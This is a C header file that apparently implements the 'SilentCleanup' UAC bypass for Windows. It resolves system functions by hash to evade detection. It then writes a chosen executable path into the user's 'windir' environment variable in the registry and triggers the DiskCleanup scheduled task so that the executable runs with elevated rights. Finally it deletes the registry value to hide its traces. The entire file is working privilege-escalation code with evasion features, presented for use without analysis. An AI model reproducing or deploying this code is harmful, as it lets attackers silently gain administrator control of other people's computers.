#ifndef SILENTCLEANUP_H
#define SILENTCLEANUP_H

#include "winapi_loader.h"
#include <taskschd.h>

#ifndef TASK_RUN_IGNORE_CONSTRAINTS
#define TASK_RUN_IGNORE_CONSTRAINTS 0x2
#endif

typedef NTSTATUS (NTAPI *NtOpenProcessToken_t)(HANDLE, ACCESS_MASK, PHANDLE);
typedef NTSTATUS (NTAPI *NtQueryInformationToken_t)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtCreateKey_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtSetValueKey_t)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *NtDeleteValueKey_t)(HANDLE, PUNICODE_STRING);
typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);

typedef HRESULT (WINAPI *CoInitializeEx_t)(LPVOID, DWORD);
typedef HRESULT (WINAPI *CoGetMalloc_t)(DWORD dwMemContext, IMalloc **ppMalloc);
typedef HRESULT (WINAPI *CoGetClassObject_t)(REFCLSID, DWORD, LPVOID, REFIID, LPVOID*);
typedef void (WINAPI *CoUninitialize_t)(void);

STRINGW(pre, "\\Registry\\User\\")
STRINGW(suf, "\\Environment")
STRINGW(windir, "windir")
STRINGW(taskpath, "\\Microsoft\\Windows\\DiskCleanup")
STRINGW(taskname, "SilentCleanup")
STRINGW(ole32_dll, "ole32.dll")

#define ntopenprocesstoken HASH("NtOpenProcessToken")
#define ntqueryinformationtoken HASH("NtQueryInformationToken")
#define ntcreatekey HASH("NtCreateKey")
#define ntsetvaluekey HASH("NtSetValueKey")
#define ntdeletevaluekey HASH("NtDeleteValueKey")
#define ntclose HASH("NtClose")

#define coinitializeex HASH("CoInitializeEx")
#define cogetmalloc HASH("CoGetMalloc")
#define cogetclassobject HASH("CoGetClassObject")
#define couninitialize HASH("CoUninitialize")

static unsigned int u64_digits(unsigned long long v) {
    unsigned int d = 1;
    while (v >= 10) {
        v /= 10;
        d++;
    }
    return d;
}

static unsigned long long ia_to_u64(const SID* s) {
    return
        ((unsigned long long)s->IdentifierAuthority.Value[5]) |
        ((unsigned long long)s->IdentifierAuthority.Value[4] << 8)  |
        ((unsigned long long)s->IdentifierAuthority.Value[3] << 16) |
        ((unsigned long long)s->IdentifierAuthority.Value[2] << 24) |
        ((unsigned long long)s->IdentifierAuthority.Value[1] << 32) |
        ((unsigned long long)s->IdentifierAuthority.Value[0] << 40);
}

static unsigned long long sid_len(PSID sid) {
    SID* s = (SID*)sid;

    unsigned long long len = 0;

    len += 2; // "S-"
    len += u64_digits(s->Revision);
    len += 1; // '-'

    unsigned long long ia = ia_to_u64(s);

    len += u64_digits(ia);

    for (ULONG i = 0; i < s->SubAuthorityCount; i++) {
        len += 1; // '-'
        len += u64_digits(s->SubAuthority[i]);
    }

    return len;
}

static wchar_t* append_u64(wchar_t* p, unsigned long long v) {
    if (v >= 10)
        p = append_u64(p, v / 10);

    *p++ = L'0' + (v % 10);
    return p;
}

static void sid_to_string(PSID sid, wchar_t* out) {
    SID* s = (SID*)sid;
    wchar_t* p = out;

    *p++ = L'S';
    *p++ = L'-';

    p = append_u64(p, s->Revision);

    *p++ = L'-';

    unsigned long long ia = ia_to_u64(s);

    p = append_u64(p, ia);

    for (ULONG k = 0; k < s->SubAuthorityCount; k++) {
        *p++ = L'-';
        p = append_u64(p, s->SubAuthority[k]);
    }

    *p = L'\0';
}

int InvokeDiskCleanupElevation(LPWSTR exePath) {
    HMODULE hNtdll = myGetModuleHandleH(ntdll_dll);

    NtOpenProcessToken_t NtOpenProcessToken = (NtOpenProcessToken_t)xGetProcAddressH(hNtdll, ntopenprocesstoken);
    NtQueryInformationToken_t NtQueryInformationToken = (NtQueryInformationToken_t)xGetProcAddressH(hNtdll, ntqueryinformationtoken);
    NtCreateKey_t NtCreateKey = (NtCreateKey_t)xGetProcAddressH(hNtdll, ntcreatekey);
    NtSetValueKey_t NtSetValueKey = (NtSetValueKey_t)xGetProcAddressH(hNtdll, ntsetvaluekey);
    NtDeleteValueKey_t NtDeleteValueKey = (NtDeleteValueKey_t)xGetProcAddressH(hNtdll, ntdeletevaluekey);
    NtClose_t NtClose = (NtClose_t)xGetProcAddressH(hNtdll, ntclose);
    LdrLoadDll_t LdrLoadDll = (LdrLoadDll_t)xGetProcAddressH(hNtdll, ldrloadll);

    const IID IID_ITaskService = {0x2FABA4C7,0x4DA9,0x4013,{0x96,0x97,0x20,0xCC,0x3F,0xD4,0x0F,0x85}};
    const CLSID CLSID_TaskScheduler = {0x0F87369F,0xA4E5,0x4CFC,{0xBD,0x3E,0x73,0xE6,0x15,0x45,0x72,0xDD}};
    const IID IID_IClassFactory = {0x00000001,0x0000,0x0000,{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}};

    HANDLE hToken;
    NtOpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken);

    ULONG len = 0;
    NtQueryInformationToken(hToken, TokenUser, NULL, 0, &len);

    UCHAR buffer[len];

    NtQueryInformationToken(hToken, TokenUser, buffer, len, &len);

    NtClose(hToken);

    TOKEN_USER* tu = (TOKEN_USER*)buffer;

    unsigned long long sid_chars = sid_len(tu->User.Sid);

    wchar_t sid[sid_chars + 1];
    sid_to_string(tu->User.Sid, sid);

    size_t pre_len = 0;
    while (pre[pre_len]) pre_len++;

    size_t suf_len = 0;
    while (suf[suf_len]) suf_len++;

    size_t path_len = pre_len + sid_chars + suf_len + 1;

    wchar_t path[path_len];
    size_t p = 0;

    for (int i = 0; pre[i]; i++) path[p++] = pre[i];
    for (int i = 0; sid[i]; i++) path[p++] = sid[i];
    for (int i = 0; suf[i]; i++) path[p++] = suf[i];
    path[p] = L'\0';

    UNICODE_STRING keyName;
    InitUnicodeString(&keyName, path);

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hKey;
    ULONG disp;

    NtCreateKey(&hKey, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &attr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);

    UNICODE_STRING valueName;
    InitUnicodeString(&valueName, windir);

    size_t dataLen = 0;
    while (exePath[dataLen]) dataLen++;

    wchar_t tmp[dataLen + 2];

    for (size_t i = 0; i < dataLen; i++)
        tmp[i] = exePath[i];

    tmp[dataLen] = L'"';
    tmp[dataLen + 1] = L'\0';

    NTSTATUS status = NtSetValueKey(hKey, &valueName, 0, REG_SZ, (PVOID)tmp, (ULONG)((dataLen + 2) * sizeof(wchar_t)));
    
	if (!NT_SUCCESS(status))
        return false;

    UNICODE_STRING ustr;
    InitUnicodeString(&ustr, ole32_dll);

    HMODULE hOle32 = NULL;
    LdrLoadDll(NULL, 0, &ustr, (PHANDLE)&hOle32);

    CoInitializeEx_t CoInitializeEx = (CoInitializeEx_t)xGetProcAddressH(hOle32, coinitializeex);
    CoGetMalloc_t CoGetMalloc = (CoGetMalloc_t)xGetProcAddressH(hOle32, cogetmalloc);
    CoGetClassObject_t CoGetClassObject = (CoGetClassObject_t)xGetProcAddressH(hOle32, cogetclassobject);
    CoUninitialize_t CoUninitialize = (CoUninitialize_t)xGetProcAddressH(hOle32, couninitialize);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    IMalloc *pMalloc = NULL;
    CoGetMalloc(MEMCTX_TASK, &pMalloc);
    
    /* ---- taskpath ---- */
    UINT len1 = 0;
    for (const OLECHAR *p = taskpath; *p++; )
        len1++;
    
    UINT byteLen1 = len1 * sizeof(OLECHAR);
    UINT total1 = sizeof(UINT) + byteLen1 + sizeof(OLECHAR);
    
    BYTE *mem1 = (BYTE*)pMalloc->lpVtbl->Alloc(pMalloc, total1);
    
    *(UINT*)mem1 = byteLen1;
    
    OLECHAR *bstrTaskFolder = (OLECHAR*)(mem1 + sizeof(UINT));
    for (UINT i = 0; i < len1; i++)
        bstrTaskFolder[i] = taskpath[i];
    
    bstrTaskFolder[len1] = L'\0';
    
    /* ---- taskname ---- */
    UINT len2 = 0;
    for (const OLECHAR *p = taskname; *p++; )
        len2++;
    
    UINT byteLen2 = len2 * sizeof(OLECHAR);
    UINT total2 = sizeof(UINT) + byteLen2 + sizeof(OLECHAR);
    
    BYTE *mem2 = (BYTE*)pMalloc->lpVtbl->Alloc(pMalloc, total2);
    
    *(UINT*)mem2 = byteLen2;
    
    OLECHAR *bstrTask = (OLECHAR*)(mem2 + sizeof(UINT));
    for (UINT i = 0; i < len2; i++)
        bstrTask[i] = taskname[i];
    
    bstrTask[len2] = L'\0';

    VARIANT var = {0};

    IClassFactory* pFactory = NULL;
    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    IRegisteredTask* pTask = NULL;
    IRunningTask* pRunningTask = NULL;

    CoGetClassObject(&CLSID_TaskScheduler, CLSCTX_INPROC_SERVER, NULL, &IID_IClassFactory, (void**)&pFactory);

    pFactory->lpVtbl->CreateInstance(pFactory, NULL, &IID_ITaskService, (void**)&pService);

    pService->lpVtbl->Connect(pService, var, var, var, var);
    pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pRootFolder);
    pRootFolder->lpVtbl->GetTask(pRootFolder, bstrTask, &pTask);

    HRESULT hr = pTask->lpVtbl->RunEx(pTask, var, TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, &pRunningTask);

    pRunningTask->lpVtbl->Release(pRunningTask);
    pTask->lpVtbl->Release(pTask);
    pRootFolder->lpVtbl->Release(pRootFolder);
    pService->lpVtbl->Release(pService);
    pFactory->lpVtbl->Release(pFactory);

    pMalloc->lpVtbl->Free(pMalloc, mem1);
    pMalloc->lpVtbl->Free(pMalloc, mem2);

    pMalloc->lpVtbl->Release(pMalloc);

    CoUninitialize();

    NtDeleteValueKey(hKey, &valueName);

    NtClose(hKey);

    return SUCCEEDED(hr);
}

#endif // SILENTCLEANUP_H
